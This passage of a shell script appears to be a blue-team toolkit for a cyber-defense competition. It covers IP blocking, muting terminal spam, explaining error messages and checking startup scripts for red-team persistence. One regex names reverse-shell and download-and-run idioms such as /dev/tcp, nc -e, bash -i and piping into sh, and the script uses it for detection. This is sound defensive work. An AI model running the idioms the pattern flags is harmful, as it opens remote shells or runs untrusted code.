            exit 1
        fi
        # shellcheck disable=SC2046
        set -- $(blocked_list)
        say "Putting back the saved blocks: $*"
        again=1
    fi
    myip=$(printf '%s\n' "$SSH_CLIENT" | awk '{print $1}')
    gw=$(ip route 2>/dev/null | awk '/^default/ {print $3; exit}')
    dns=$(awk '/^nameserver/ {print $2}' /etc/resolv.conf 2>/dev/null)
    mine=$(ip -4 -o addr 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
    for ip in "$@"; do
        if ! valid_ip "$ip"; then say "  skipped $ip: not an IPv4 address"; continue; fi
        case "${ip%/*}" in 127.*|0.*) say "  skipped $ip: that is this box"; continue ;; esac
        skip=''
        for keep in $myip $gw $dns $mine; do
            in_net "$keep" "$ip" && { skip=$keep; break; }
        done
        if [ -z "$skip" ] && is_protected "$ip"; then
            say "  skipped $ip: it is on your protected list (sh first30.sh protect shows it)"
            continue
        fi
        if [ -n "$skip" ]; then
            say "  skipped $ip: it covers $skip (this box, your SSH session, the default gateway, or a DNS server)"
            continue
        fi
        if fw_block "$ip"; then
            now=$(date -u '+%Y-%m-%d %H:%M')
            if [ -z "$again" ]; then
                printf '%s %s UTC %s\n' "$ip" "$now" "$HOST" >> "$VAULT/blocked.txt"
                autonote "blocked $ip in and out"
            fi
            say "  blocked $ip in and out, at $now UTC on $HOST"
        else
            say "  could not block $ip: no working iptables, nft or firewalld on this box"
        fi
    done
    say ""
    say "For the incident report: the time, $HOST, the address, and what it was doing"
    say "(C2 traffic is T1071, password guessing is T1110). Where else it shows up: sh first30.sh trace <address>"
    say "The list is in $VAULT/blocked.txt. After a reboot, run: sh first30.sh block"
    say "To undo one: sh first30.sh unblock <address>"
}

do_unblock() {   # $@ = addresses
    need_root
    if [ "$#" -eq 0 ]; then
        say "Usage: sh first30.sh unblock <address>"
        exit 1
    fi
    for ip in "$@"; do
        if ! valid_ip "$ip"; then say "  skipped $ip: not an IPv4 address"; continue; fi
        fw_unblock "$ip"
        if [ -f "$VAULT/blocked.txt" ]; then
            awk -v ip="$ip" '$1 != ip' "$VAULT/blocked.txt" > "$VAULT/blocked.txt.new" &&
                mv "$VAULT/blocked.txt.new" "$VAULT/blocked.txt"
        fi
        autonote "unblocked $ip"
        say "  unblocked $ip"
    done
}

# ---------------------------------------------------------------- quiet (terminal spam)
# Red team floods terminals: wall writes to every terminal at once, write to one.
# Both are setgid-tty programs, so taking away all their permissions (000) stops
# every account that is not root, and killing the ones running stops spam in
# progress. Every open terminal is set to 600 (the same as mesg n), and the console
# screens (/dev/vcs*, what is shown in the Proxmox console) to 600, so only root
# can read them. Root can still write straight to a terminal: spam that keeps
# coming after this is from a root session. Find it with who -u and kill it.
do_quiet() {
    need_root
    : >> "$QUIET_UNDO"
    for p in $SPAM_PROGS; do
        f=$(command -v "$p" 2>/dev/null) || continue
        r=$(readlink -f "$f" 2>/dev/null)
        [ -n "$r" ] || r=$f
        [ -f "$r" ] || continue
        grep -q " $r\$" "$QUIET_UNDO" || printf '%s %s\n' "$(stat -c %a "$r")" "$r" >> "$QUIET_UNDO"
        chmod 000 "$r" && say "  $p ($r): turned off (mode 000; it was $(awk -v f="$r" '$2 == f {print $1}' "$QUIET_UNDO"))"
    done
    for p in $SPAM_PROGS bsd-write write.ul; do
        pkill -9 -x "$p" 2>/dev/null && say "  killed the running $p"
    done
    # /dev/vcs* = the text on each console screen, /dev/fb* = the picture on it
    n=0
    for v in /dev/vcs* /dev/fb[0-9]*; do
        [ -c "$v" ] || continue
        grep -q " $v\$" "$QUIET_UNDO" || printf '%s %s\n' "$(stat -c %a "$v")" "$v" >> "$QUIET_UNDO"
        chmod 600 "$v" && n=$((n + 1))
    done
    [ "$n" -gt 0 ] && say "  console screens (/dev/vcs*, /dev/fb*): only root can read them now ($n devices)"
    n=0
    for t in /dev/pts/[0-9]*; do
        [ -c "$t" ] && chmod 600 "$t" && n=$((n + 1))
    done
    for t in /dev/tty[1-9]*; do [ -c "$t" ] && chmod 600 "$t"; done
    say "  SSH terminals open now ($n) and the consoles: set to 600, like mesg n (new logins start at the normal setting)"
    chmod 600 "$QUIET_UNDO"
    autonote "turned on spam protection: wall and write off, terminals and console screens 600 (undo: sh first30.sh undo-quiet)"
    say ""
    say "Done. If messages still appear, they come from a root session. Find it with: who -u"
    say "then kill it (pkill -9 -t pts/<number>) and change root's password. /dev settings reset at reboot: run this again then."
    say "To undo: sh first30.sh undo-quiet"
}

do_undo_quiet() {
    need_root
    if [ ! -s "$QUIET_UNDO" ]; then say "Nothing to undo: spam protection was not turned on with this script."; exit 1; fi
    while read -r qm qf; do
        [ -e "$qf" ] && chmod "$qm" "$qf" && say "  $qf: back to mode $qm"
    done < "$QUIET_UNDO"
    rm -f "$QUIET_UNDO"
    autonote "turned spam protection off (undo-quiet)"
}


# ======================================================================
# SOS (the "something is wrong right now" button), an error explainer, domain
# and DC checks, AD rescue over LDAPS, hardening with undo, known bugs, kick,
# restore from backup, a password finder, incident facts, reminders, protected
# addresses, tripwire ports, startup scripts on boxes without systemd, and scout
# mode for odd devices. Nothing here changes the box unless you type yes.
# ======================================================================

# ---------------------------------------------------------------- v4 helpers
why() { say "  Why: $*"; }
byhand() { say "  By hand: $*"; }

# A yes/no question. Only the full word yes counts, so nothing happens by accident.
yes_ask() {
    ask "$1 Type yes to go ahead (anything else skips):"
    [ "$ANS" = yes ]
}

# Read a password without showing it. It stays in memory only: never in a file,
# the command line or the history (a command line shows up in ps for everyone).
read_secret() {   # read_secret "prompt" -> $SECRET
    SECRET=''
    say "$1"
    trap 'stty echo 2>/dev/null; exit 1' INT TERM
    [ -t 0 ] && stty -echo 2>/dev/null
    read -r SECRET || SECRET=''
    [ -t 0 ] && stty echo 2>/dev/null
    trap 'exit 1' INT TERM
    say ""
}

os_name() {
    on=$(grep '^PRETTY_NAME=' /etc/os-release 2>/dev/null | cut -d'"' -f2)
    [ -n "$on" ] || on=$(cat /etc/slackware-version 2>/dev/null)
    [ -n "$on" ] || on=$(grep '^CHROMEOS_RELEASE_DESCRIPTION=' /etc/lsb-release 2>/dev/null | cut -d= -f2-)
    [ -n "$on" ] || on=$(uname -sr 2>/dev/null)
    say "$on"
}

# Which init system starts things on this box: systemd, openrc, slackware, sysv, upstart, runit, busybox
init_kind() {
    ik=$(cat /proc/1/comm 2>/dev/null)
    case "$ik" in
        systemd) say systemd; return ;;
        runit*) say runit; return ;;
    esac
    if [ -d /etc/runlevels ] || have openrc; then say openrc
    elif [ -f /etc/slackware-version ] || [ -f /etc/rc.d/rc.S ]; then say slackware
    elif have initctl && [ -d /etc/init ] && ls /etc/init/*.conf >/dev/null 2>&1; then say upstart
    elif [ -d /etc/init.d ] && ls -d /etc/rc[0-6].d >/dev/null 2>&1; then say sysv
    else say busybox; fi
}

# Is a TCP port open? 0 = open, 1 = closed or filtered, 2 = no tool here to test with.
tcp_ok() {   # tcp_ok host port
    if have timeout && have bash; then
        timeout 3 bash -c 'exec 3<>"/dev/tcp/$0/$1"' "$1" "$2" >/dev/null 2>&1 && return 0
        return 1
    fi
    if have timeout && have python3; then
        timeout 4 python3 -c 'import socket,sys; socket.create_connection((sys.argv[1], int(sys.argv[2])), 3)' "$1" "$2" >/dev/null 2>&1 && return 0
        return 1
    fi
    if have nc; then
        if have timeout; then timeout 4 nc -z -w 3 "$1" "$2" >/dev/null 2>&1 && return 0
        else nc -z -w 3 "$1" "$2" >/dev/null 2>&1 && return 0; fi
        return 1
    fi
    return 2
}

# IPv4 addresses for a name, with whatever this box has (getent, nslookup, host).
resolve4() {
    r4=$( { getent ahostsv4 "$1" 2>/dev/null || getent hosts "$1" 2>/dev/null; } | awk '{print $1}')
    if [ -z "$r4" ] && have nslookup; then
        r4=$(nslookup "$1" 2>/dev/null | awk '/^Name:/ {n = 1; next} n && /^Address/ {print $NF}')
    fi
    if [ -z "$r4" ] && have host; then r4=$(host "$1" 2>/dev/null | awk '/has address/ {print $NF}'); fi
    printf '%s\n' "$r4" | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' | sort -u | head -5
}

# DNS SRV lookup: "host port" lines (how Windows and Linux find the domain controllers)
dns_srv() {
    if have dig; then dig +short -t SRV "$1" 2>/dev/null | awk 'NF >= 4 {print $4, $3}'
    elif have host; then host -t SRV "$1" 2>/dev/null | awk '/has SRV record/ {print $NF, $(NF - 1)}'
    elif have nslookup; then nslookup -type=SRV "$1" 2>/dev/null | awk '/service =/ {print $NF, $(NF - 1)}'
    fi | sed 's/\. / /; s/\.$//' | sort -u | head -5
}

# 20261109123456 -> seconds since 1970 (UTC), with plain awk math (works in every awk).
ymdhms_epoch() {
    printf '%s\n' "$1" | awk '{
        y = substr($0, 1, 4) + 0; m = substr($0, 5, 2) + 0; d = substr($0, 7, 2) + 0
        H = substr($0, 9, 2) + 0; M = substr($0, 11, 2) + 0; S = substr($0, 13, 2) + 0
        if (m <= 2) { y -= 1; m += 12 }
        era = int(y / 400); yoe = y - era * 400
        doy = int((153 * (m - 3) + 2) / 5) + d - 1
        doe = yoe * 365 + int(yoe / 4) - int(yoe / 100) + doy
        printf "%d\n", (era * 146097 + doe - 719468) * 86400 + H * 3600 + M * 60 + S }'
}

# Version compare that understands 1.9.5p2, 9.6p1, 2.4.49: prints -1, 0 or 1.
vcmp() {
    awk -v a="$1" -v b="$2" 'BEGIN {
        gsub(/[^0-9]+/, " ", a); gsub(/[^0-9]+/, " ", b)
        na = split(a, x, " "); nb = split(b, y, " "); n = (na > nb) ? na : nb
        for (i = 1; i <= n; i++) { p = x[i] + 0; q = y[i] + 0
            if (p < q) { print -1; exit } if (p > q) { print 1; exit } }
        print 0 }'
}
vin() {   # vin VERSION LOW HIGH: is LOW <= VERSION <= HIGH?
    [ "$(vcmp "$1" "$2")" != -1 ] && [ "$(vcmp "$1" "$3")" != 1 ]
}

# ---------------------------------------------------------------- reminders
# A to-do list the menu keeps showing until you mark it done: PCRs to file,
# incident reports to write, things to redo after a reboot.
REMIND="$VAULT/reminders.txt"
remind() {   # remind "text"
    [ -d "$VAULT" ] || return 0
    awk -v t="$*" 'substr($0, 9) == t {f = 1} END {exit !f}' "$REMIND" 2>/dev/null && return 0
    printf '%s | %s\n' "$(date '+%H:%M')" "$*" >> "$REMIND"
    chmod 600 "$REMIND" 2>/dev/null
}
reminders_count() { [ -s "$REMIND" ] && grep -c . "$REMIND" || echo 0; }

do_reminders() {
    need_root
    say "== Reminders (things not done yet)"
    if [ -s "$VAULT/.ontrack" ]; then say "  Before your last SOS you were: $(cat "$VAULT/.ontrack")"; fi
    if [ ! -s "$REMIND" ]; then
        say "  None. The script adds one when you change a password (PCR), kick someone, or find an incident."
    else
        awk '{printf "  %d. %s\n", NR, $0}' "$REMIND"
    fi
    [ -t 0 ] || return 0
    ask "Type the numbers that are done (like 1 3), C to clear the SOS note, or press Enter to keep everything:"
    case "$ANS" in
        ''|' ') return 0 ;;
        [Cc]) rm -f "$VAULT/.ontrack"; say "  Cleared."; return 0 ;;
    esac
    rd_keep="$REMIND.keep.$$"
    awk -v done=" $ANS " 'index(done, " " NR " ") {print > "/dev/stderr"; next} {print}' "$REMIND" > "$rd_keep" 2>> "$VAULT/reminders_done.txt"
    mv "$rd_keep" "$REMIND"
    chmod 600 "$REMIND" "$VAULT/reminders_done.txt" 2>/dev/null
    say "  Marked done. $(reminders_count) left."
}

# ---------------------------------------------------------------- protected addresses
# Addresses that must never be blocked or kicked: the scoring engine, the Black Team
# "magic box" (last year .3: blocking it locked teams out), your jump box.
PROTECT="$VAULT/protect.txt"
protected_list() { [ -s "$PROTECT" ] && awk '{print $1}' "$PROTECT" | sort -u; }
is_protected() {   # is_protected ADDRESS_OR_NET -> 0 if it touches a protected address
    for pp in $(protected_list); do
        in_net "${pp%/*}" "$1" && return 0
        in_net "${1%/*}" "$pp" && return 0
    done
    return 1
}
do_protect() {
    need_root
    if [ "$#" -eq 0 ]; then
        say "== Protected addresses (block and kick will never touch these)"
        if [ -s "$PROTECT" ]; then sed 's/^/  /' "$PROTECT"; else
            say "  None yet. Add the scoring engine and the Black Team box from the packet:"
            say "  sh first30.sh protect <address> [<address> ...]   (example address only: 192.168.220.3)"
        fi
        why "a block that hits the scoring engine costs every service check (rule 4.11), and last year's"
        say "        packet said touching the .3 Black Team box locks you out of your own environment."
        return 0
    fi
    for pa in "$@"; do
        valid_ip "$pa" || { say "  skipped $pa: not an IPv4 address or network"; continue; }
        grep -q "^$pa " "$PROTECT" 2>/dev/null && { say "  $pa is already protected"; continue; }
        printf '%s added %s\n' "$pa" "$(now_utc)" >> "$PROTECT"
        say "  protected: $pa"
    done
    chmod 600 "$PROTECT"
    autonote "protected from blocks: $*"
}
do_unprotect() {
    need_root
    for pa in "$@"; do
        [ -s "$PROTECT" ] || break
        grep -v "^$pa " "$PROTECT" > "$PROTECT.new.$$"; mv "$PROTECT.new.$$" "$PROTECT"
        say "  no longer protected: $pa"
    done
}

# ---------------------------------------------------------------- incident facts
facts_done() {   # remove the facts file again if nothing was recorded in it
    [ -n "$FACTS" ] && [ -f "$FACTS" ] && [ "$(grep -c . "$FACTS")" -le 6 ] && rm -f "$FACTS" && FACTS=''
    return 0
}
# The facts an incident report needs (rule 9.4): addresses, times, accounts, what
# was done. The script only collects facts and proof. YOU write the report: an
# AI-written report scores zero.
FACTS=''
fact() {   # fact "text": one line in the current incident facts file
    [ -n "$FACTS" ] || return 0
    printf '%s  %s\n' "$(date '+%H:%M:%S')" "$*" >> "$FACTS"
}
facts_start() {   # facts_start "what this is about" -> $FACTS is the file
    mkdir -p "$VAULT/incidents" && chmod 700 "$VAULT/incidents"
    FACTS="$VAULT/incidents/facts_${HOST}_$(date +%m%d-%H%M%S).txt"
    {
        say "INCIDENT FACTS (not a report: your team writes the report in its own words)"
        say "box        : $HOST   $(ip -4 -o addr 2>/dev/null | awk '$2 != "lo" {print $4}' | tr '\n' ' ')"
        say "OS         : $(os_name)"
        say "about      : $*"
        say "started    : $(date '+%Y-%m-%d %H:%M:%S %Z')  ($(now_utc))"
        say "----- what happened, in order (times are this box's clock) -----"
    } > "$FACTS"
    chmod 600 "$FACTS"
}

# ---------------------------------------------------------------- error explainer
# Paste the exact error. It says what the error means and the next step. The
# rule from our competition notes: read the exact error and let it choose the
# next step ("timed out" = firewall, "refused" = service stopped, "775" = locked).
# Each line below: words to look for @@ what it means @@ what to do. Add your own.
decode_error() {   # decode_error "the error text"
    F30_ERR=$1 awk -F'@@' 'BEGIN {t = tolower(ENVIRON["F30_ERR"]); n = 0}
        /^#/ || NF < 3 {next}
        { if (t ~ $1) { n++; printf "  %d. %s\n     Do this: %s\n", n, $2, $3 } }
        END { if (n == 0) {
            print "  No match in the list. Read it slowly: the LAST words usually name the cause."
            print "     Do this: search the exact words plus the program name, or ask your lead. Add the answer to this list for next time." } }' <<'F30EOF'
# ---- network
timed out|timeout@@Nothing answered at all. A firewall is dropping the traffic (here, on the target, or the router), or the box is down.@@ping it, then test the port from another box (nc -zv <ip> <port>). Check the firewall: iptables -S, nft list ruleset, or the router. It is not a password problem.
connection refused|econnrefused|actively refused@@The box answered, but nothing listens on that port: the service is stopped, crashed, or moved to another port.@@check the service (systemctl status <name>) and what listens (ss -ltnp). Start it, or find which port it moved to.
no route to host@@The box is down, or its firewall rejects you on purpose (Red Hat firewalld does this by default).@@on the target: firewall-cmd --list-all, iptables -S. On the way: the router.
network is unreachable@@This box has no route to that network: its IP address, mask or gateway is wrong (or was changed).@@ip addr and ip route. Compare with the baseline (sh first30.sh hunt shows network changes).
name or service not known|temporary failure in name resolution|could not resolve|unknown host|nxdomain|server can.t find@@DNS: this box cannot turn the name into an address.@@cat /etc/resolv.conf (is the DNS server right and up?), then try the IP address directly. Check /etc/hosts for planted lines.
connection reset by peer|kex_exchange_identification@@The other side hung up right away: a crashing service, hosts.deny / TCP wrappers, fail2ban, or the wrong service on that port.@@on the target: tail the service log, check /etc/hosts.allow and /etc/hosts.deny, and sshd -t for SSH.
address already in use|bind.*failed.*98|eaddrinuse@@Another program already holds that port, so the service cannot start. Red team sometimes squats the port.@@ss -ltnp | grep :<port> shows who holds it. If it is not yours: evidence, then stop it, then start the real service.
certificate verify failed|self.signed certificate|unable to get local issuer|x509@@TLS: the certificate is not trusted. In competitions this is often the event's SSL interception.@@the packet says how to get their root CA (last year: http://10.0.0.20/). For a quick test only: curl -k.
# ---- SSH and logins
permission denied \(publickey@@SSH only takes keys here, or your key is not in authorized_keys.@@on the box: sshd -T | grep -i -E "passwordauth|pubkeyauth" and check ~/.ssh/authorized_keys (and its permissions: 600, folder 700).
permission denied, please try again|authentication failure|incorrect password|login incorrect@@Wrong password, or the account is locked, expired, or blocked by PAM or AllowUsers.@@passwd -S <user>, chage -l <user>, grep -i allow /etc/ssh/sshd_config, and the PAM check in the hunt. Stop after 2 wrong tries so the account does not lock.
too many authentication failures@@Your SSH client offered too many keys before trying the password.@@ssh -o IdentitiesOnly=yes -o PubkeyAuthentication=no <user>@<box>
host key verification failed|remote host identification has changed@@The box has a new SSH host key: it was reset, rebuilt, or someone is in the middle.@@ask your team if the box was reset. If yes: ssh-keygen -R <ip>. If nobody reset it, tell your lead first.
this account is currently not available@@The account's shell is /sbin/nologin or /bin/false.@@grep <user> /etc/passwd. If it should log in: usermod -s /bin/bash <user> (red team sometimes swaps shells).
account has expired|your account has expired@@The account's expiry date passed (chage).@@chage -l <user>, then chage -E -1 <user> to remove the expiry.
user is not in the sudoers file|not in the sudoers@@That account has no sudo rights.@@use root (su -) or add it with visudo, if your lead agrees.
authentication token manipulation error@@passwd could not write /etc/shadow: it is locked (chattr +i), read-only, or the disk is full.@@lsattr /etc/shadow (chattr -i if locked), df -h, mount | grep " / ".
operation not permitted@@Even root may not change it: the file has chattr +i (locked), or SELinux or AppArmor blocks it.@@lsattr <file>. If you see an i: chattr -i <file>. Red team locks their backdoors this way.
read-only file system@@The disk was remounted read-only (disk errors), or it is a read-only system area.@@mount | grep " / ", dmesg | tail. Tell your lead before you remount.
no space left on device@@The disk is full (or out of inodes). Services crash and logs stop.@@df -h and df -i. Find the big files: du -xh / 2>/dev/null | sort -h | tail. Red team fills disks on purpose.
# ---- services (systemd)
status=203/exec|203/exec@@systemd cannot run the program: the file is gone or not executable (red team deleted it).@@ls -l <program>, then reinstall its package. The hunt shows the reinstall command.
status=217/user|217/user@@The account the service runs as does not exist anymore (deleted).@@systemctl cat <service> | grep User=, then recreate that account (same name) and start it again.
status=200/chdir@@The service's working folder is missing.@@systemctl cat <service> | grep WorkingDirectory, then restore that folder from the backup.
status=226/namespace@@A folder the service needs (ReadWritePaths and similar) is missing.@@systemctl cat <service>, restore the missing folder.
status=1/failure|code=exited, status=1/@@The program started and quit with an error, most often a bad config file.@@journalctl -u <service> -n 30 --no-pager, then test the config: nginx -t, apache2ctl -t, sshd -t, named-checkconf, postfix check, testparm -s.
is masked|unit .* is masked@@The service was masked: systemd refuses to start it at all.@@systemctl unmask <service>, then systemctl start <service>.
failed to connect to bus|system has not been booted with systemd@@This box (or container) does not use systemd.@@use service <name> start, /etc/init.d/<name> start, rc-service <name> start (Alpine) or /etc/rc.d/rc.<name> start (Slackware).
text file busy@@That program file is running right now, so it cannot be replaced.@@stop the program first, then replace the file.
command not found@@The program is gone, or PATH was changed.@@ls -l /usr/bin/<name> /bin/<name>, echo $PATH. Reinstall its package if it was deleted.
killed$|out of memory|oom-killer@@The kernel killed a program for using too much memory.@@dmesg | grep -i oom, then find the memory hog (ps aux --sort=-rss | head).
segmentation fault@@The program crashed. A swapped binary or a planted library (LD_PRELOAD) can cause it.@@run the hunt: the package and preload checks show swapped files.
could not get lock|unable to acquire the dpkg frontend lock|is another process using it@@Another apt or dpkg holds the package lock (red team does this to stop repairs).@@fuser -v /var/lib/dpkg/lock-frontend shows who. If it is not a real update: evidence, kill it, dpkg --configure -a.
# ---- MAC (AppArmor / SELinux)
apparmor="denied"|apparmor=.denied@@AppArmor blocked a program. A planted or edited profile can break a service on purpose.@@aa-status, then look at the profile named in the error (in /etc/apparmor.d). Remove a planted one: apparmor_parser -R <file>.
avc: *denied|avc:  denied|selinux is preventing@@SELinux blocked a program, often a file with the wrong label after a copy or restore.@@ausearch -m avc -ts recent, then restorecon -Rv <path>. Do not turn SELinux off without your lead.
# ---- Kerberos, sssd, domain
preauthentication failed|kdc_err_preauth_failed|preauth.*failed@@Kerberos rejected the password. For a box joined to the domain this often means its computer account password was changed in AD.@@sh first30.sh domain. A user: wrong password. This box: rejoin (adcli join --ldap-passwd ...), like marvin at Invitational 2.
clock skew too great|krb_ap_err_skew@@This box's clock is more than 5 minutes off the domain controller's. Kerberos refuses.@@set the time from the DC: chronyc makestep, or date -s "<DC time>". The domain check shows the gap.
cannot contact any kdc|cannot find kdc|cannot locate kdc|kdc unreachable@@Kerberos cannot reach a domain controller: the DC is down, port 88 is blocked, or DNS lost the DC records.@@sh first30.sh domain (it tests DNS and ports 88 and 389 on the DC).
client not found in kerberos database|kdc_err_c_principal_unknown@@That account does not exist in the domain anymore (deleted).@@on the DC, or from Linux: sh first30.sh ad, then restore the deleted user and file a PCR.
credentials have been revoked|kdc_err_client_revoked@@The domain account is locked out or disabled.@@sh first30.sh ad (list locked and disabled users, then unlock or enable).
message stream modified@@A known bug between Linux adcli/realm joins and Windows Server 2025.@@join with the password set over LDAP: adcli join --ldap-passwd -U <admin> <domain>
# ---- LDAP and AD error codes (data 52e and friends)
data 52e@@AD: wrong password (the account exists).@@check the password. Stop after 2 tries so it does not lock. An app may still use the OLD password (Keycloak did at Invitational 2).
data 525@@AD: that user does not exist (deleted or renamed).@@restore it: sh first30.sh ad (deleted users), then file a PCR.
data 530@@AD: not allowed to log on at this time (logon hours).@@check the account's logon hours in AD.
data 531@@AD: not allowed to log on from this computer.@@check the account's "Log On To" list in AD.
data 532|password has expired@@AD: the password expired.@@set a new password (and file a PCR if the scorer uses it).
data 533|account is disabled|account disabled@@AD: the account is disabled.@@enable it: sh first30.sh ad (Linux) or Enable-ADAccount on the DC.
data 701|account has expired@@AD: the account expired.@@remove the expiry in AD (Set-ADAccountExpiration -Clear).
data 773|must change password|user must reset@@AD: the user must change the password before logging on.@@set a password for them (sh first30.sh ad, choice 7).
data 775|account is locked|locked out@@AD: the account is locked out (too many wrong passwords, or red team locking it on purpose).@@unlock it: sh first30.sh ad, then find who is guessing (hunt: failed logins by address).
ldap.*error 49|invalid credentials|ldap_bind: invalid@@LDAP rejected the login. The data code after it says why (52e, 775, 533...).@@find the "data" number in the full error and look that up here.
strong(er)? authentication required|confidentiality required@@The DC requires signed or encrypted LDAP.@@use ldaps://<dc> (port 636) instead of ldap://.
can.t contact ldap server@@LDAP is not reachable: port 389/636 blocked, the DC is down, or (for ldaps) the certificate is refused.@@test the port: sh first30.sh domain. For a quick ldaps test: LDAPTLS_REQCERT=never.
unwilling to perform|password does not meet|password policy@@AD rejected the new password: too short, too simple, or used before.@@use a longer password with upper and lower case, a number and a symbol.
# ---- databases and web
access denied for user@@MySQL/MariaDB: wrong password, or that user may not log in from that address.@@check the app's config file for the password it uses. If you changed it, the app needs the new one too.
can.t connect to local mysql server|can.t connect to mysql server@@MySQL/MariaDB is not running, or not where the app looks.@@systemctl status mariadb (or mysql), and the error log in /var/log/mysql.
is blocked because of many connection errors@@MySQL blocked that host after failed connections.@@mysqladmin flush-hosts
password authentication failed for user|no pg_hba.conf entry@@PostgreSQL: wrong password, or pg_hba.conf does not allow that address.@@check pg_hba.conf and the app's password, then reload PostgreSQL.
(^| )401( |$)|unauthorized@@HTTP 401: the login was rejected. A password changed, or the app's own login to AD or a database broke.@@test the login by hand, then look at the app's log for the real error.
(^| )403( |$)|forbidden@@HTTP 403: the server refuses: file permissions, an .htaccess rule, or the web root changed.@@ls -la on the web root, check .htaccess and the site config. Compare with the backup (sh first30.sh restore).
(^| )404( |$)|404 not found|page not found@@HTTP 404: the page or file is gone (deleted, moved, or the web root changed).@@check the web root and the site config. Restore from the backup: sh first30.sh restore <file>.
(^| )500( |$)|internal server error@@HTTP 500: the app or its config failed.@@read the web server's error log (/var/log/apache2/error.log, /var/log/nginx/error.log).
(^| )502( |$)|bad gateway|(^| )504( |$)|gateway time@@HTTP 502/504: the web server is up but the app behind it (php-fpm, a container, an app server) is down or slow.@@check that service (systemctl status php*-fpm, docker ps) and the proxy settings.
(^| )503( |$)|service unavailable@@HTTP 503: the app is stopped or overloaded.@@check the app service and its log. On IIS: the application pool is stopped.
F30EOF
}

do_why() {
    if [ -z "$*" ]; then
        if [ -t 0 ]; then
            ask "Paste or type the exact error message, then press Enter:"
            set -- "$ANS"
        else
            say "Usage: sh first30.sh why \"the exact error message\""; return 1
        fi
    fi
    say "== What this error means"
    say "  You saw: $(printf '%s' "$*" | cut -c1-200)"
    decode_error "$*"
    say "  Tip: the exact words matter. \"timed out\" and \"refused\" point to different fixes."
}

# ---------------------------------------------------------------- startup scripts without systemd
# Alpine (OpenRC), Slackware (rc.d), old SysV boxes, Chrome OS (upstart) and Tiny
# Core start things at boot from plain scripts. Red team adds a line there.
JOBS_RE='curl |wget |base64 +(-d|--decode)|python[0-9.]* +-c|perl +-e|/dev/tcp/|/dev/udp/|nc +-e|ncat +-e|socat |mkfifo|openssl +s_client|bash +-i|sh +-i|\| *(ba)?sh( |$)'
init_files() {
    for f in /etc/inittab /etc/rc.local /etc/rc.d/rc.local /etc/rc.d/rc.local_shutdown /opt/bootlocal.sh /opt/bootsync.sh \
        /etc/init.d/* /etc/local.d/* /etc/rc.d/rc.* /etc/init/*.conf /etc/sv/*/run /etc/service/*/run /var/service/*/run; do
        [ -f "$f" ] && say "$f"
    done
}
chk_init() {
    ci_k=$(init_kind)
    [ "$ci_k" = systemd ] && return 0
    sec init "Startup scripts on this box (it uses $ci_k, not systemd; T1037, T1543)"
    ci_out='' ci_n=0
    for f in $(init_files); do
        ci_n=$((ci_n + 1))
        ci_w=''
        from_package "$f"
        ci_pk=$?
        ci_chg=''
        [ -f "$BASE" ] && [ "$f" -nt "$BASE" ] && ci_chg=1
        # a script a package installed, untouched since the start, is trusted (the package check covers edits)
        [ "$ci_pk" = 0 ] && [ -z "$ci_chg" ] && continue
        [ -n "$ci_chg" ] && ci_w="$ci_w changed-since-the-baseline"
        [ "$ci_pk" = 1 ] && ci_w="$ci_w not-from-a-package"
        grep -q -E "$JOBS_RE" "$f" 2>/dev/null && ci_w="$ci_w downloads-or-opens-a-shell"
        grep -v -E '/tmp/\.(X11|ICE|font|XIM|Test)-unix' "$f" 2>/dev/null | grep -q -E '(^|[^a-z])/(tmp|dev/shm|var/tmp)/' && ci_w="$ci_w runs-something-from-temp"
        [ -n "$ci_w" ] && ci_out="$ci_out
  $f   (file date $(date -r "$f" '+%m-%d %H:%M' 2>/dev/null))
      marked:$ci_w"
    done
    ci_tab=$(grep -v -E '^[[:space:]]*(#|$)' /etc/inittab 2>/dev/null | grep -E ':(respawn|once|wait|askfirst|sysinit|boot):' |
        grep -v -E ':(/sbin/|/bin/|/usr/sbin/|/usr/bin/)?(getty|agetty|mingetty|openrc|rc|init|reboot|swapon|swapoff|umount|mount|sh /etc/rc|/etc/rc\.d/rc\.[A-Z0-9]+)' | head -10)
    [ -n "$ci_tab" ] && ci_out="$ci_out
  /etc/inittab lines that start a program (respawn brings it back every time you kill it):
$(say "$ci_tab" | sed 's/^/      /')"
    case "$ci_k" in
        openrc) say "  starts at boot: $(rc-update show 2>/dev/null | awk -F'|' '{gsub(/ /, "", $1); printf "%s ", $1}')" ;;
        slackware) say "  starts at boot (rc.* files that can run): $(for f in /etc/rc.d/rc.*; do [ -x "$f" ] && [ -f "$f" ] && printf '%s ' "${f##*/}"; done)" ;;
    esac
    say "  $ci_n startup files looked at."
    if [ -n "$ci_out" ]; then
        say "$ci_out" | sed '/^$/d'
        flag
        nxt "read each marked file. A line your team did not add: copy the file to evidence, then remove the line."
        case "$ci_k" in
            openrc) byhand "rc-status -a ; rc-update show ; ls -la /etc/local.d   (rc-update del <name> stops one starting at boot)" ;;
            slackware) byhand "ls -la /etc/rc.d/rc.*   (an x means it starts at boot; chmod -x /etc/rc.d/rc.<name> stops it)" ;;
            *) byhand "cat /etc/inittab ; ls -la /etc/init.d /etc/rc*.d   (kill -HUP 1 after fixing inittab)" ;;
        esac
    else
        ok "no startup script was changed, runs a download or a shell, or runs from a temp folder"
    fi
}

# ---------------------------------------------------------------- AppArmor and SELinux blocks
# Red team can load a profile that blocks a service from its own files, so the
# service breaks with "Permission denied" even for root. Last year's guide
# reloaded AppArmor to clear "weaponized" blocks.
chk_mac() {
    { [ -d /sys/kernel/security/apparmor ] || have getenforce; } || return 0
    sec mac "AppArmor and SELinux: blocks that break services (T1562.001, T1489)"
    cm_since=$(date -r "$VAULT/.stamp_$HOST" '+%Y-%m-%d %H:%M:%S' 2>/dev/null)
    [ -n "$cm_since" ] || cm_since='-2h'
    cm_d=$( { klog "$cm_since" | tail -n 5000; tail -n 3000 /var/log/audit/audit.log 2>/dev/null; } |
        grep -E 'apparmor="DENIED"|avc: +denied' |
        sed -n -e 's/.*apparmor="DENIED".*operation="\([^"]*\)".*profile="\([^"]*\)".*name="\([^"]*\)".*comm="\([^"]*\)".*/AppArmor blocked \4 (profile \2): \1 \3/p' \
               -e 's/.*avc: *denied *{ \([^}]*\)}.*comm="\([^"]*\)".*name="\([^"]*\)".*/SELinux blocked \2: \1 \3/p' |
        sort | uniq -c | sort -rn | head -12)
    cm_p=''
    if [ -d /etc/apparmor.d ] && [ -f "$BASE" ]; then
        cm_p=$(find /etc/apparmor.d -maxdepth 2 -type f -newer "$BASE" 2>/dev/null | while read -r f; do
            from_package "$f"; [ $? = 1 ] && say "$f"; done)
    fi
